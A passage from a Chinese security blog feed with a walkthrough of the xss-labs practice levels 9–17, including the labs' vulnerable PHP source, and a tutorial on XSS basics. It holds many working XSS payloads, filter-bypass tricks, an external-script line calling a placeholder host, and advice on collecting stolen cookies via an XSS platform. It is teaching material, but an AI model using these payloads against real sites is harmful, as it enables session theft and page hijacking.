class="hljs-symbol">&amp;#120;</span><span class="hljs-symbol">&amp;#115;</span><span class="hljs-symbol">&amp;#115;</span><span class="hljs-symbol">&amp;#39;</span><span class="hljs-symbol">&amp;#41;</span> /* http://www.baidu.com */<br></code></pre></td></tr></table></figure><p>查看源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level10.php?keyword=well done!&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;欢迎来到level9&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;欢迎来到level9&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-comment">//各种过滤</span><br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,<span class="hljs-variable">$str5</span>);<br><span class="hljs-variable">$str7</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&#x27;&amp;quot&#x27;</span>,<span class="hljs-variable">$str6</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level9.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//判断是否含有http://</span><br><span class="hljs-keyword">if</span>(<span class="hljs-literal">false</span>===<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$str7</span>,<span class="hljs-string">&#x27;http://&#x27;</span>))    <br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;<br>        &#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="hljs-variable">$str7</span>.<span class="hljs-string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str7</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure><p>strpos — 查找字符串首次出现的位置</p><h2 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h2><p>经过测试，还是过滤了许多字符，查看下源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str11</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str22</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level10.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br></code></pre></td></tr></table></figure><p>.htmlspecialchars($str).   keyword传入得str被实体化</p><input name="t_sort" value="'.$str33.'" type="hidden"><p>隐藏的input标签，接受str33，使用t_sort传参，其中&lt;&gt;被空格代替，所以不能闭合input</p><p>可以使用input中的onfocus,由于输入框被隐藏，需要使用type&#x3D;’text’恢复</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">&quot;onfocus=javascript:alert(&#x27;xss&#x27;) type=&quot;text<br></code></pre></td></tr></table></figure><p><img src="/2023/03/15/xss-labs/image-20230318113807636.png" alt="image-20230318113807636"></p><h2 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h2><p><img src="/2023/03/15/xss-labs/image-20230318114351329.png" alt="image-20230318114351329"></p><p>这个有点像referer的参数（就是记录通过什么地址转跳到这里的），这关我才会和这个有关系，抓包</p><p><img src="/2023/03/15/xss-labs/image-20230318114919208.png" alt="image-20230318114919208"></p><p>在referer中插入上关的语句即可</p><p><img src="/2023/03/15/xss-labs/image-20230318115124656.png" alt="image-20230318115124656"></p><h2 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h2><p><img src="/2023/03/15/xss-labs/image-20230318115229308.png" alt="image-20230318115229308"></p><p>这个是user-agent头，修改为上关语句即可</p><p><img src="/2023/03/15/xss-labs/image-20230318115458947.png" alt="image-20230318115458947"></p><h2 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h2><p><img src="/2023/03/15/xss-labs/image-20230318115912276.png" alt="image-20230318115912276"></p><p>这次是cookie</p><p>以前的语句仍然有效，还可以使用</p><p>“ onclick&#x3D;alert(‘xss’) type&#x3D;”text </p><p>onclick 事件在用户单击元素时发生。</p><h2 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h2><p>题目给的网站出现问题，这题本来是利用转跳到的网站，在那网站去上传一个，属性里面含有xss代码的图片，以达到弹窗的效果</p><h2 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h2><p>源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;html ng-app&gt;<br><br>&lt;head&gt;<br><br>        &lt;meta charset=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br><br>        &lt;script src=<span class="hljs-string">&quot;angular.min.js&quot;</span>&gt;&lt;/script&gt;<br><br>&lt;script&gt;<br><br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span><br><span class="hljs-function"></span>&#123;   <br><br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);<br><br> window.location.href=<span class="hljs-string">&quot;level16.php?keyword=test&quot;</span>; <br><br>&#125;<br><br>&lt;/script&gt;<br><br>&lt;title&gt;欢迎来到level15&lt;/title&gt;<br><br>&lt;/head&gt;<br><br>&lt;h1 align=center&gt;欢迎来到第<span class="hljs-number">15</span>关，自己想个办法走出去吧！&lt;/h1&gt;<br><br>&lt;p align=center&gt;&lt;img src=level15.png&gt;&lt;/p&gt;<br><br><span class="hljs-meta">&lt;?php</span> <br><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;src&quot;</span>];<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;body&gt;&lt;span class=&quot;ng-include:&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&#x27;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#x27;</span>;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>get传参src</p><p>ng-include指令就是文件包涵的意思，用来包涵外部的html文件，如果包涵的内容是地址，需要加引号</p><p>特别值得注意的几点如下： </p><ul><li>1.ng-include,如果单纯指定地址，必须要加引号</li><li>2.ng-include,加载外部html，script标签中的内容不执行</li><li>3.ng-include,加载外部html中含有style标签样式可以识别</li></ul><p>尝试包含第一关</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">?src=&#x27;level1.php&#x27;<br>/* 构造语句*/<br>?src=&#x27;level1.php?name<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;)&gt;</span>&#x27;<br></code></pre></td></tr></table></figure><h2 id="less-16"><a href="#less-16" class="headerlink" title="less-16"></a>less-16</h2><p>经过测试script,&#x2F;,空格等都被过滤了，</p><p>空格可以用回车代替（url编码:%0a），使用不需要闭合的标签，比如<img>、<details>、<svg>等标签，</svg></details></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?keyword=&lt;img%0asrc=<span class="hljs-string">&#x27;111&#x27;</span>%0aonerror=alert(<span class="hljs-string">&#x27;xss&#x27;</span>)&gt;<br></code></pre></td></tr></table></figure><h2 id="less-17"><a href="#less-17" class="headerlink" title="less-17"></a>less-17</h2><p><img src="/2023/03/15/xss-labs/image-20230318222752268.png" alt="image-20230318222752268"></p><p>传入的参数都出现在了embed标签上，打开后缀名为swf的文件（FLASH插件的文件，现在很多浏览器都不支持FLASH插件了）</p><p>embed标签可以理解为定义了一个区域，可以放图片、视频、音频等内容，但是呢相对于他们，embed标签打开不了文件的时候就会没有显示的区域在，他们就能有块错误的区域 再看一下onfocus和onclick事件，这两事件是等价的，都是一触即发</p><p>解决这个题需要一个支持flash的浏览器，可以把源代码中的swf文件改掉</p><p><img src="/2023/03/15/xss-labs/image-20230318223416502.png" alt="image-20230318223416502"></p><p>传参arg02</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?arg02= <span class="hljs-attribute">onclick</span>=alert()<br></code></pre></td></tr></table></figure><p>18,19,20这几关用到flash xss由于浏览器不支持flash就不做了先，挂个链接看看</p><p><a href="https://blog.csdn.net/u014029795/article/details/103213877">(110条消息) XSS-labs Level 19 Flash XSS_xss-labs level19_baynk的博客-CSDN博客</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/"/>
    <url>/2023/03/11/XSS%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h2 id="XSS基础"><a href="#XSS基础" class="headerlink" title="XSS基础"></a>XSS基础</h2><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p> XSS又叫CSS（Cross Site Script）跨站脚本攻击是指恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。</p><p> xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是寻找参数未过滤的输出函数。<br>常见的输出函数有： echo printf print print_r sprintf die var-dump var_export.</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>攻击者对含有漏洞的服务器发起XSS攻击（注入JS代码）。<br>诱使受害者打开受到攻击的服务器URL。<br>受害者在Web浏览器中打开URL，恶意脚本执行。</p><h2 id="攻击类型"><a href="#攻击类型" class="headerlink" title="攻击类型"></a>攻击类型</h2><p>反射型XSS：&lt;非持久化&gt; 攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。一般是后端代码进行处理</p><p>存储型XSS：&lt;持久化&gt; 代码是存储在服务器数据库中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS非常危险，容易造成蠕虫，大量盗窃cookie（虽然还有种DOM型XSS，但是也还是包括在存储型XSS内）。</p><p>DOM型XSS：基于文档对象模型Document Objeet Model，DOM)的一种漏洞。DOM是一个与平台、编程语言无关的接口，它允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果能够成为显示页面的一部分。DOM中有很多对象，其中一些是用户可以操纵的，如uRI ，location，refelTer等。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生DOM XSS漏洞。一般是浏览器前端代码进行处理。</p><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p>1.挂马<br>2.盗取用户Cookie。<br>3.DOS（拒绝服务）客户端浏览器。<br>4.钓鱼攻击，高级的钓鱼技巧。<br>5.删除目标文章、恶意篡改数据、嫁祸。<br>6.劫持用户Web行为，甚至进一步渗透内网。<br>7.爆发Web2.0蠕虫。<br>8.蠕虫式的DDoS攻击。<br>9.蠕虫式挂马攻击、刷广告、刷浏量、破坏网上数据<br>10.其它安全问题</p><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>1.搭建xss平台收集cookie</p><p>2.对于反射型可以构造链接，当用户点击时，用户的cookie会被发到xss平台</p><p>3.窃取用户的cookie后可以基于xss平台进行利用</p><h2 id="搭建闯关平台-xss-labs"><a href="#搭建闯关平台-xss-labs" class="headerlink" title="搭建闯关平台(xss-labs)"></a>搭建闯关平台(xss-labs)</h2><p>首先下载源码包<a href="https://github.com/do0dl3/xss-labs">https://github.com/do0dl3/xss-labs</a></p><p>搭建PHPstudy环境，推荐使用phpstudy2018的版本</p><p>将源码包解压到www目录下就可以</p><p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users\zhang\AppData\Roaming\Typora\typora-user-images\image-20230311165719232.png" alt="image-20230311165719232"></p><h2 id="常用的标签和属性"><a href="#常用的标签和属性" class="headerlink" title="常用的标签和属性"></a>常用的标签和属性</h2><h3 id="scirpt"><a href="#scirpt" class="headerlink" title="scirpt"></a>scirpt</h3><script> 标签用于定义客户端脚本，比如 JavaScript。<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;hack&quot;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>   #弹出hack<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-regexp">/hack/</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>   #弹出hack<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>        #弹出1，对于数字可以不用引号<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>      #弹出cookie<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">http://xxx.com/xss.js</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>  #引用外部的xss<br></code></pre></td></tr></table></figure>### img<img> 标签定义 HTML 页面中的图像。<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1);</span>&gt;</span>   <br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(</span>&quot;<span class="hljs-attr">xss</span>&quot;);&gt;</span><br><br></code></pre></td></tr></table></figure>### input<input> 标签规定了用户可以在其中输入数据的输入字段。<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">onfocus 事件在对象获得焦点时发生：<br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">alert(1);</span>&gt;</span><br><br></code></pre></td></tr></table></figure>竞争焦点，从而触发[onblur事件](https://so.csdn.net/so/search?q=onblur事件&spm=1001.2101.3001.7020)：<input onblur=alert(1) autofocus><input autofocus>input 标签的 autofocus 属性规定当页面加载时 元素应该自动获得焦点。可以通过autofocus属性自动执行本身的focus事件，这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户去触发：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">&quot;alert(1);&quot;</span> <span class="hljs-attr">autofocus</span>&gt;</span><br><br>&quot; οnclick=alert(1)&gt;        这样需要点击一下输入框<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>&quot; onmouseover=alert(1)&gt;    需要鼠标划过输入框<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br></code></pre></td></tr></table></figure>### details<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">details</span>&gt;</span> 标签通过提供用户开启关闭的交互式控件，规定了用户可见的或者隐藏的需求的补充细节。ontoggle 事件规定了在用户打开或关闭 <span class="hljs-tag">&lt;<span class="hljs-name">details</span>&gt;</span> 元素时触发：<br><br><span class="hljs-tag">&lt;<span class="hljs-name">details</span> <span class="hljs-attr">ontoggle</span>=<span class="hljs-string">alert(1);</span>&gt;</span><br><br></code></pre></td></tr></table></figure>使用details 标签的 open 属性触发ontoggle事件，无需用户去点击即可触发：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">details</span> <span class="hljs-attr">open</span> <span class="hljs-attr">ontoggle</span>=<span class="hljs-string">alert(1);</span>&gt;</span><br><br></code></pre></td></tr></table></figure>### svg<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span> 标签用来在HTML页面中直接嵌入SVG 文件的代码。<br><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert(1);</span>&gt;</span><br><br></code></pre></td></tr></table></figure>### video<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">video</span> <span class="hljs-attr">οnlοadstart</span>=<span class="hljs-string">alert(1)</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/media/hack-the-planet.mp4&quot;</span> /&gt;</span><br><br></code></pre></td></tr></table></figure>### style<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">οnlοad</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><br></code></pre></td></tr></table></figure>### body<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">οnlοad</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">οnpageshοw</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br><br></code></pre></td></tr></table></figure>### iframe<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span>&gt;</span> 标签会创建包含另外一个文档的内联框架。  <br><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert(1);</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure>## 常见绕过过滤方法1.空格过滤当空格被过滤了时，我们可以用 / 来代替空格：/**/，注释符号绕过；/符号绕过；<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;img/src<span class="hljs-operator">=</span><span class="hljs-string">&quot;x&quot;</span>/onerror<span class="hljs-operator">=</span>alert(<span class="hljs-number">1</span>)<span class="hljs-comment">;&gt;</span><br><br>也可以：<br><br>&lt;img/src<span class="hljs-operator">=</span><span class="hljs-string">&quot;x&quot;</span>onerror<span class="hljs-operator">=</span>alert(<span class="hljs-number">1</span>)<span class="hljs-comment">;&gt;</span><br></code></pre></td></tr></table></figure>2.引号过滤如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号：<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=x <span class="hljs-attribute">onerror</span>=alert(`xss`);&gt;<br><br></code></pre></td></tr></table></figure>3.括号过滤当括号被过滤的时候可以使用throw来绕过。throw 语句用于当错误发生时抛出一个错误。<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=x <span class="hljs-attribute">onerror</span>=<span class="hljs-string">&quot;javascript:window.onerror=alert;throw 1&quot;</span>&gt;<br>&lt;a <span class="hljs-attribute">onmouseover</span>=<span class="hljs-string">&quot;javascript:window.onerror=alert;throw 1&gt;</span><br></code></pre></td></tr></table></figure>4.关键字过滤大小写绕过<sCRiPt>alert(1);<ImG src="x" onerror="alert(1);">双写绕过<p>有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过</p><p><scrscriptipt>alert(1);</scrscriptipt><br><imimgg srsrcc="x" onerror="alert(1);"><br>5.字符串拼接绕过</imimgg></p><p>利用eval()函数，与PHP的eval()函数相同，JavaScript的eval()函数也可以计算 JavaScript 字符串，并把它作为脚本代码来执行。</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">&lt;img src=<span class="hljs-string">&quot;x&quot;</span> onerror=<span class="hljs-string">&quot;a=&#x27;aler&#x27;;b=&#x27;t&#x27;;c=&#x27;(1)&#x27;;eval(a+b+c)&quot;</span>&gt;<br>&lt;img 